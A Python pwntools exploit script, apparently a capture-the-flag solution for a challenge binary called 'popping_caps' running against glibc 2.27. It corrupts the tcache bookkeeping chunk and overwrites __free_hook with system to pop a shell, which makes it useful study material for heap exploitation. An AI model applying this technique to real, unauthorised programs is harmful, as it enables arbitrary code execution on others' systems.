import pwn as p

target = p.process('./popping_caps', env={'LD_PRELOAD': './libc-2.27.so'})
# p.gdb.attach(target)

libc = p.ELF('./libc-2.27.so')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def malloc(size: int) -> None:
    prints(target.recvuntil(b'Your choice:'))
    target.sendline(b'1')
    prints(target.recvuntil(b'How many:'))
    target.sendline(b(str(size)))


def free(delta: int) -> None:
    prints(target.recvuntil(b'Your choice:'))
    target.sendline(b'2')
    prints(target.recvuntil(b'Whats in a free:'))
    target.sendline(b(str(delta)))


def write(payload: bytes) -> None:
    prints(target.recvuntil(b'Your choice:'))
    target.sendline(b'3')
    prints(target.recvuntil(b'Read me in:'))
    target.send(payload)


first_line = target.recvline().strip().replace(b'Here is system ', b'')
system_leak = int(first_line, 16)
print('system leak:', hex(system_leak))

libc_base = system_leak - libc.symbols['system']
print('libc_base:', hex(libc_base))

free_hook = libc_base + libc.symbols['__free_hook']
print('free_hook:', hex(free_hook))

# free the bookkeeping chunk because we can
malloc(0x0)
free(-0x250)

# allocate the bookkeeping chunk, because why not
malloc(0x240)

# write address of next target
payload = p.p64(0x1)  # counter for a 0x20 freed chunk
payload += p.p64(0x0)*7  # padding
payload += p.p64(free_hook)  # target address
write(payload)

# allocate the fake chunk on free_hook
malloc(0x10)

# assign system call to free hook
write(p.p64(system_leak))

# "free" the section containing "/bin/sh", since there is an occurence in libc
free(-0x239ace)

target.interactive()
